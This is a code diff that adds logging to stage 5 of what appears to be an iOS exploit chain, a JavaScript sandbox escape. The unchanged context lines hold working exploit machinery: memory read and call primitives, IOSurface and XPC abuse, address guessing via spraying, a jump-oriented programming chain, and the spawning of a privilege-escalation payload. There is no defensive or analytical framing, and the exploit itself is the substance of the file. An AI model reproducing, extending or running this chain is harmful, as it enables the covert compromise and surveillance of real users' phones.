@@ -1,7 +1,16 @@
 (() => {
-  // Define log = print so all logging works
-  let log = print;
-  sbx1_begin = Date.now(); print("[SBX1] Stage 5 started - initializing sandbox escape 1");
+  let sbx1_syslog = null;
+  try { sbx1_syslog = log; } catch (_) {}
+  const sbx1_print = print;
+  function SBX1_TRACE(msg, reportError = false) {
+    const text = String(msg);
+    try { sbx1_print("[SBX1] " + text, reportError); } catch (_) {}
+    try {
+      if (sbx1_syslog) sbx1_syslog("sbx1: " + text);
+    } catch (_) {}
+  }
+  sbx1_begin = Date.now();
+  SBX1_TRACE("Stage 5 started - initializing sandbox escape 1");
   const peCode = "&v={{LPE_64BITE}}";
   let wc_fcall = fcall;
   let wc_uread64 = read64;
@@ -12,8 +21,9 @@
   let gpu_fcall_sleep = null && gpuFcallEnableSleep;
   let gpu_fcall_wake = null && gpuFcallDisableSleep;
   function LOG(msg) {
-    if (true) print('[SBX1] ' + msg);
+    if (true) SBX1_TRACE(msg);
   }
+  LOG("Top-level primitive capture complete");
   let wc_get_cstring = function (js_str) {
     let s = js_str + "\x00";
     resolve_rope(s);
@@ -4794,6 +4804,7 @@
   let invoke_class = objc_getClass("NSInvocation");
   let jsc_class = objc_getClass("JSContext");
   let nsthread_class = objc_getClass("NSThread");
+  LOG("Resolving XPC and bootstrap symbols");
   let XPC_RETAIN = func_resolve("xpc_retain");
   let XPC_BOOL_CREATE = func_resolve("xpc_bool_create");
   let XPC_RELEASE = func_resolve("xpc_release");
@@ -4819,6 +4830,7 @@
   let XPC_ENDPOINT_CREATE = func_resolve("xpc_endpoint_create");
   let XPC_ENDPOINT_DISPOSE = func_resolve("xpc_endpoint_dispose");
   let XPC_CONNECTION_SEND_MESSAGE_WITH_REPLY = func_resolve("xpc_connection_send_message_with_reply");
+  LOG("Resolved XPC and bootstrap symbols");
   let IOSURFACE_CREATE_XPC_OBJECT = func_resolve("IOSurfaceCreateXPCObject");
   let MIG_GET_REPLY_PORT = func_resolve("mig_get_reply_port");
   let DISPATCH_DATA_CREATE = func_resolve("dispatch_data_create");
@@ -6146,7 +6158,9 @@
     wc_fcall(xpac(func_resolve("uname")), utsname);
     return utsname + 256n * 4n;
   }
+  LOG("Querying device_machine");
   let device_machine = wc_get_device_machine();
+  LOG(`device_machine pointer: ${device_machine.hex()}`);
   function sbx1sbx1() {
     let kr = KERN_SUCCESS;
     LOG("Sbx1 starting...");
@@ -6157,8 +6171,11 @@
       is_a12_devices = false;
       LOG("Running on non-A12 Devices");
     }
+    LOG(`surface_size budget: ${surface_size.hex()}`);
     let surface = create_iosurface(surface_size);
+    LOG(`surface handle: ${surface.hex()}`);
     let spray_memory_object = setup_guess_address(surface);
+    LOG(`spray_memory_object: ${spray_memory_object.hex()}`);
     let sbx1sbx1_ctx = sbx1sbx1_exp(SBX1SBX1_EXP_SIZE);
     LOG(`connection: ${sbx1sbx1_ctx.connection.hex()}`);
     LOG(`source_surface: ${sbx1sbx1_ctx.source_surface.hex()}`);
@@ -6880,15 +6897,19 @@
       pe_main_js_data = g_pe_main_js_data;
       pe_post_js_data = g_pe_post_js_data;
     }
+    LOG("[MPD] building CFStrings for PE payloads");
     let pe_stage_1_cfstring = mpd_create_cfstring(pe_stage1_js_data);
     let pe_main_cfstring = mpd_create_cfstring(pe_main_js_data);
+    LOG("[MPD] CFStrings ready");
     let arr = mpd_setup_fcall_jopchain();
     let jsvm_fcall_buff = arr[0];
     let jsvm_fcall_pc = arr[1];
     let jsvm_fcall_args = arr[2];
+    LOG("[MPD] JOP chain ready");
     mpd_fcall(DLOPEN, mpd_get_cstring("/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore"), 2n);
     let mpd_jsc_class = mpd_objc_getClass(mpd_get_cstring("JSContext"));
     let ctx = mpd_objc_alloc_init(mpd_jsc_class);
+    LOG("[MPD] JSContext allocated");
     let isnan_value = mpd_objectForKeyedSubscript(ctx, "isNaN");
     let isnan_func_addr = mpd_read64(isnan_value + 0x8n);
     let isnan_executable_addr = mpd_read64(isnan_func_addr + 0x18n);
@@ -6974,8 +6995,10 @@
     LOG("[MPD] pe spawned");
   }
   sbx1sbx1_interval = Date.now();
+  LOG("Entering sbx1sbx1()");
   let sbx1sbx1_succeeded = sbx1sbx1();
   sbx1sbx1_interval = Date.now() - sbx1sbx1_interval;
+  LOG(`sbx1sbx1() returned ${sbx1sbx1_succeeded}`);
   LOG(`[profiler] Sbx1 EXP bypass took ${exp_bypass_interval} ms`);
   if (sbx1sbx1_succeeded) {
     LOG(`[profiler] Sbx1 took ${sbx1sbx1_interval} ms`);
@@ -6983,12 +7006,15 @@
     LOG(`[profiler] Sbx1 failed in ${sbx1sbx1_interval} ms`);
   }
   if (sbx1sbx1_succeeded) {
+    LOG("Calling spawn_pe()");
     spawn_pe();
   }
   LOG("closing remaker_connection: " + remaker_connection);
   xpc_connection_cancel(remaker_connection);
   LOG = function (msg) {
-    log('sbx0: ' + msg);
+    try {
+      if (sbx1_syslog) sbx1_syslog('sbx0: ' + msg);
+    } catch (_) {}
   };
   sbx1_end = Date.now();
   LOG("ALL DONE!");
